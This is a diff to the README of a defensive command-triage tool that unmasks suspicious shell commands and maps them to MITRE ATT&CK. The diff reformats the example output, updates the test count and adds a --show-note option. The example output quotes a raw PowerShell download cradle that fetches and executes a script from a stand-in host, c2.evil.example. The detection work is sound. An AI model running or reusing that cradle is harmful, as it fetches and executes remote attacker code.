@@ -6,7 +6,7 @@
 
 [![Python 3.10+ stdlib-only](https://img.shields.io/badge/python-3.10%2B%20stdlib--only-blue.svg)](#)
 [![Dependencies: Zero](https://img.shields.io/badge/dependencies-zero-009688.svg)](#)
-[![Tests](https://img.shields.io/badge/tests-142%20passed-success.svg)](#)
+[![Tests](https://img.shields.io/badge/tests-148%20passed-success.svg)](#)
 [![FPR: 0.0000](https://img.shields.io/badge/FPR-0.0000%20(67%20fixtures)-brightgreen.svg)](#)
 
 [Quickstart](#quickstart) · [Architecture](#architecture) · [Detection Rigidity](#detection-rigidity) · [CLI Reference](#cli-reference) · [ADRs](docs/adr/README.md)
@@ -88,48 +88,33 @@ cmd-unmask --benchmark -v
 ### Example Output (`--format pretty --no-color --no-sigma`)
 
 ```text
-╔════════════════════════════════════════════════════════════════════╗
-║ Triage Verdict [cli] | Severity: HIGH (70/100)                     ║
-╚════════════════════════════════════════════════════════════════════╝
++----------------------------------------------------------------------------+
+| Triage Verdict [cli] | Severity: HIGH (70/100)                             |
++----------------------------------------------------------------------------+
+| Exec Brief    : C2/Ingress: external network target(s)                     |
+|                 http://c2.evil.example:8080/stage.ps1, c2.evil.example.    |
+|                 Key flags: -NoP / -NoProfile.                              |
++----------------------------------------------------------------------------+
 
 [1] UNMASKING TIMELINE (LAYER-BY-LAYER)
-  └─► Step 0 [Raw Input]
+  +-- Step 0 [Raw Input]
       powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
 
-[2] EXTRACTED IOCs (DEFANGED)
-  ├─► [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 0 [Raw Input])
-  └─► [domain] c2[.]evil[.]example (from Step 0 [Raw Input])
+[2] BEHAVIORAL EVIDENCE & CAPABILITIES
+  |-- T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
+  |-- T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 0 [Raw Input])
+  |-- [CAPABILITY] Network: Net.WebClient
+  |-- [CAPABILITY] Network: DownloadString
+  +-- [RATIONALE] HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
 
-[3] WHY THIS WAS FLAGGED (MITRE ATT&CK & EVIDENCE)
-  ├─► T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
-  └─► T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 0 [Raw Input])
+[3] EXTRACTED IOCs (DEFANGED)
+  |-- [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 0 [Raw Input])
+  +-- [domain] c2[.]evil[.]example (from Step 0 [Raw Input])
 
-[BEHAVIORAL CAPABILITIES]
-  ├─► Network: Net.WebClient
-  └─► Network: DownloadString
+[4] RECOMMENDED L1/L2 NEXT STEPS
+  +-- 1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
 
-[VERDICT RATIONALE]
-  └─► HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
-
-[4] READY-TO-PASTE SOC TICKET NOTE
-────────────────────────────────────────────────────────────────────
-[SOC TRIAGE NOTE - cli]
-Verdict       : HIGH (Risk Score: 70/100)
-Obfuscation   : None (Unobfuscated)
-Rationale     : HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
-Raw Command   : powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.ev... (114 chars total)
-Unmasked Cmd  :
-  powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
-Capabilities  :
-  - Network: Net.WebClient
-  - Network: DownloadString
-Extracted IOCs:
-  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
-  - [DOMAIN] c2[.]evil[.]example
-MITRE ATT&CK  :
-  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
-  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
-────────────────────────────────────────────────────────────────────
+[i] SOC Ticket Note omitted on stdout (use --show-note to print)
 ```
 
 ---
@@ -172,6 +157,7 @@ Matches `python -m cmd_unmask --help`:
 | `--format` | `CHOICE` | Output format (`pretty`, `markdown`, `json`, `jsonl`) | `pretty` |
 | `--no-color` | — | Disable ANSI colors in pretty terminal output | `False` |
 | `--copy-note` | — | Copy the Ready-to-Paste SOC Ticket Note to the OS clipboard | `False` |
+| `--show-note` | — | Print the full borderless `[SOC TRIAGE NOTE]` block to stdout in pretty mode | `False` |
 | `--no-defang` | — | Emit raw IOCs instead of defanged IOCs | `False` |
 | `--sigma` | — | Synthesize and print Sigma YAML rule(s) to stdout for non-benign findings | `False` |
 | `--sigma-out` | `SIGMA_OUT` | Write synthesized Sigma YAML rule(s) to a file or directory path | `None` |
@@ -206,7 +192,7 @@ Matches `python -m cmd_unmask --help`:
 ### Development & Testing
 
 ```bash
-# Run full unit and integration test suite (142 tests)
+# Run full unit and integration test suite (148 tests)
 python -m unittest discover -s tests -v
 
 # Run Regression Corpus benchmark and Detection Rigidity Gate
